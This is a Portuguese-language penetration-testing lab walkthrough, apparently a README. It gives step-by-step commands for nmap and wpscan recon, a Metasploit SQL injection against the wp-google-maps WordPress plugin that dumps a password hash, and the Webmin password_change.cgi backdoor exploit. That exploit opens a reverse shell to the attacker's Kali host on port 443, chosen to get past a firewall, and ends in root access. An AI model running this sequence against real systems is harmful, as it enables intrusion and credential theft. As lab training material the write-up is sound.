# First Pass Recon

```
1º sudo nmap -sS -T4 'Seu IP'
``` 
"Utilizar o IP do Kali para descobrir os outros dispostivos na rede, e assim saber os serviços que estão rodando."

```
2º wpscan  —url ‘IP ALVO’
```
"Utilizando o "wpscan", para assim levantar os plugins que estão rodando dentro da aplicação em questão. 
 Analisando então os plugins, pode-se localizar o plugin 'wp-google-maps'."

```
3º sudo nmap -sV -p- -v -Pn 'IP ALVO' 
> -sV : Obtém a versão dos serviços rodando no alvo.
> -p- : Realiza um scanner em todas as 65535 portas.
> -v : Modo verboso.
> -Pn : Ignora o ICMP. 
```
"Localize na saída analise os serviços utilizados pela aplicação e de atenção ao 'Webmin' 
 Dentro do terminal no Kali Linux utilize 'searchsploit webmin' Lista os exploits"

```
4º sudo msfconsole
```
"Fornece informações sobre vulnerabilidades de segurança e auxilia em testes de penetração e desenvolvimento de assinaturas IDS."

```
5º msf5 > search wp-google-maps
```
"Busca na ferramenta exploits para os plugins levantados no passo 2, localize o modo auxiliar para SQLinjection no wp-google-maps."

```
6º msf5 > use 0  
```
"Efetua no Metasploit o uso do auxiliar para SQLinjection."

```
7º msf5 auxiliary (admin/http/wp-google-maps-sqli) > options 
```
"Mostra as opções e quais dados devem ser setados no exploit."

```
8º msf5 auxiliary (admin/http/wp-google-maps-sqli) > set rhosts 'IP ALVO' 
rhosts ⇒ ip do alvo
```
"Adiciona o IP do alvo ao exploit para SQLinjection" 

```
9º msf5 auxiliary (admin/http/wp-google-maps-sqli) > run 
```
"Efetua o SQLinjection, trazendo no console que existe uma credencial salva no server, 
 capturando assim o ID e HASH da senha do usuário. 

```
10º msf5 auxiliary (admin/http/wp-google-maps-sqli) > search webmin 
```
"O MSF lista os exploits, no caso veja que foi encontrado o 'webmin password_change.cgi Backdoor', 
 exploit que será explorado nesse lab."

```
11º msf5 auxiliary (admin/http/wp-google-maps-sqli) > use 2
```
"Comando para iniciar o exploit que será utilizado."

```
12º msf5 auxiliary (admin/http/wp-google-maps-sqli) > options 
```
"Mostra todas as opções que se pode setar no exploit, mostrando também que já veio setado um 'payload' no caso em questão, 
 caso não viesse, o usuário deveria fazer o 'payload'."

```
13º msf5 auxiliary (admin/http/wp-google-maps-sqli) > info 
```
"Analisa as informações do exploit, mostrando a versão."

```
14º msf5 auxiliary (admin/http/wp-google-maps-sqli) > set forceexploit true 
```
"Caso a versão seja diferente o comando 'force' faz com que o msf execute o exploit independente da versão." 

```
15º msf5 auxiliary (admin/http/wp-google-maps-sqli) > options 
```
"Analise as informações a serem setadas, como no caso o 'rhosts, lhost, lport e ssl'."

```
16º msf5 auxiliary (admin/http/wp-google-maps-sqli) > set rhosts 'IP ALVO'
> rhost: IP DO ALVO 
(Realiza conexão remota)
```

```
17º msf5 auxiliary (admin/http/wp-google-maps-sqli) > set lhost 'IP KALI' 
> lhost: IP KALI 
(Recebe a conexão reversa)
```

```
18º msf5 auxiliary (admin/http/wp-google-maps-sqli) > set lport 443
> lport: 443 
(Número da porta onde irá simular a conexão com a web, evitar setar número alto para burlar o firewall.)
```

```
19º msf5 auxiliary (admin/http/wp-google-maps-sqli) > set ssl true 
> ssl: TRUE 
(Confirma para que assim tenha a conexão)
```

```
20º msf5 auxiliary (admin/http/wp-google-maps-sqli) > run 
```

Após o msf5 abrir a sessão com o alvo, digite 'whoami' caso seja 'root' digite no terminal ```-> shell <-``` acesso realizado. 
